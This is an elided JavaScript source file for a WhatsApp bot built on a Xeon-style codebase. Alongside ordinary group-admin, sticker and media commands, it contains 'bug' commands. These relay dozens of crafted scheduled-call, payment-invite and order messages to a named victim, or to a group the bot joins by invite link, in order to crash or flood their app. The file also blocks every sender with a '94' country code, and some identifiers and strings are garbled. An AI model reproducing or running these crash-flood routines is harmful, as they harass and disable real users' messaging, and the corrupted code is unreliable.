...
module.exports = 𝐑𝐎𝐖𝐃𝐘Botinc = async (𝐑𝐎𝐖𝐃𝐘Botinc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
        ...
        const botNumber = await 𝐑𝐎𝐖𝐃𝐘Botinc.decodeJid(𝐑𝐎𝐖𝐃𝐘Botinc.user.id)
        ...
        const groupMetadata = m.isGroup ? await 𝐑𝐎𝐖𝐃𝐘Botinc.groupMetadata(m.chat).catch(e => {}) : ''
        ...
        expiredCheck(𝐑𝐎𝐖𝐃𝐘Botinc, m, premium);
//group chat msg by xeon
const replygcxeon = (teks) => {
𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
...
𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}
...
message: {
"listResponseMessage": {
title: `Rowdy ur father`
}}
}
async function RowdyCrashy(dgxeon,chat) {
𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(chat, {
...
let { key } = await 𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await 𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!𝐑𝐎𝐖𝐃𝐘BotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        if (autoread) {
            𝐑𝐎𝐖𝐃𝐘BotInc.readMessages([m.key])
        }
        if (global.autoTyping) {

        𝐑𝐎𝐖𝐃𝐘BotInc.sendPresenceUpdate('composing', from)
        ...
        𝐑𝐎𝐖𝐃𝐘BotInc.sendPresenceUpdate('recording', from)

        }

        
        //bot number online status, available=online, unavailable=offline
        𝐑𝐎𝐖𝐃𝐘BotInc.sendPresenceUpdate('unavail 11 Ofable', from)
        ...
        𝐑𝐎𝐖𝐃𝐘BotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            𝐑𝐎𝐖𝐃𝐘BotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('94') && global.anti94 === true) {
            return 𝐑𝐎𝐖𝐃𝐘BotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await 𝐑𝐎𝐖𝐃𝐘BotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await 𝐑𝐎𝐖𝐃𝐘BotInc.getName(i)}\nFN:${await 𝐑𝐎𝐖𝐃𝐘BotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
...
𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
...
const sendzip = (teks) => {
𝐑𝐎𝐖𝐃𝐘BotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
...
senddocu(buffer)
        ...
        if (m.isGroup && !m.key.fromMe) {
            ...
            if (afk.checkAfkUser(m.sender, _afk)) {
                ...
                𝐑𝐎𝐖𝐃𝐘BotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
            ...
            case 'join':
                try {
                    ...
                    await 𝐑𝐎𝐖𝐃𝐘Botinc.groupAcceptInvite(result).then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                } catch {
    ...
    case 'autostatusview':{
            ...
            case 'setppbot':
                ...
                var medis = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await 𝐑𝐎𝐖𝐃𝐘Botinc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                    ...
                    var memeg = await 𝐑𝐎𝐖𝐃𝐘Botinc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
            ...
            case 'block':
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.updateBlockStatus(blockw, 'block').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await 𝐑𝐎𝐖𝐃𝐘Botinc.updateBlockStatus(blockww, 'unblock').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('Bye Everyone 🥺')
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(m.chat, {
                    document: malas,
            ...
            case 'bcgroup': {
                ...
                let getGroups = await 𝐑𝐎𝐖𝐃𝐘Botinc.groupFetchAllParticipating()
            ...
            case 'closetime':
                ...
                setTimeout(() => {
                    ...
                    𝐑𝐎𝐖𝐃𝐘Botinc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                ...
                setTimeout(() => {
                    ...
                    𝐑𝐎𝐖𝐃𝐘Botinc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcxeon(mess.group)
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcxeon(mess.group)
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                ...
                if (args[0] == 'full') {
                    ...
                    var memeg = await 𝐑𝐎𝐖𝐃𝐘Botinc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
            ...
            case 'grup':
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'close') {
                    await 𝐑𝐎𝐖𝐃𝐘Botinc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`Success In Closing The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'open') {
                    await 𝐑𝐎𝐖𝐃𝐘Botinc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
            ...
            case 'editinfo':
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await 𝐑𝐎𝐖𝐃𝐘Botinc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await 𝐑𝐎𝐖𝐃𝐘Botinc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
            ...
            case 'resetlink':
                ...
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                await 𝐑𝐎𝐖𝐃𝐘Botinc.groupRevokeInvite(m.chat)
                    .then(res => {
...
`.trim()
            ...
            case 'donasi':
                ...
                break
case 'owner': {
const repf = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                ...
                if (/image/.test(mime)) {
                    ...
                    let encmedia = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    ...
                    let media = await quoted.download()
                    let encmedia = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
            ...
            case 'smeme': {
                ...
                let dwnld = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
...
𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(quoted, "gifee")
𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
...
break
            ...
            case 'toimg': {
                ...
                replygcxeon(mess.wait)
                let media = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(qmsg)
            ...
            case 'toaudio': {
                ...
                replygcxeon(mess.wait)
                let media = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadMediaMessage(qmsg)
            ...
            case 'emojimix': {
                ...
                for (let res of anu.results) {
                    let encmedia = await 𝐑𝐎𝐖𝐃𝐘Botinc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
            ...
            case 'toviewonce': {
                ...
                if (/image/.test(mime)) {
                    anuan = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(quoted)
                    𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                    ...
                    anuanuan = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(quoted)
                    𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
            ...
            case 'toqr': {
                ...
                await 𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
...
let ceknye = await 𝐑𝐎𝐖𝐃𝐘Botinc.onWhatsApp(bnnd)
...
break
            case 'addvideo': {
                ...
                let delb = await 𝐑𝐎𝐖𝐃𝐘Botinc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
            ...
            case 'delsticker': {
                ...
                Sticker𝐑𝐎𝐖𝐃𝐘Botinc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
...
case 'sound160':
case 'sound161':
𝐑𝐎𝐖𝐃𝐘Botinc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await 𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(m.chat, { audio: 𝐑𝐎𝐖𝐃𝐘Botinc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
...
amount = "50"
for (let i = 0; i < amount; i++) {
𝐑𝐎𝐖𝐃𝐘Botinc.sendMessage(victim,{
...
amount = "50"
for (let i = 0; i < amount; i++) {
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(victim,{ 
...
if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
...
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
...
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
...
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
...
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await 𝐑𝐎𝐖𝐃𝐘Botinc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
...
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
...
𝐑𝐎𝐖𝐃𝐘Botinc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
...
if (typemenu === 'v1') {
      ...
      renderLargerThumbnail: true
        ...
        𝐑𝐎𝐖𝐃𝐘Botinc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
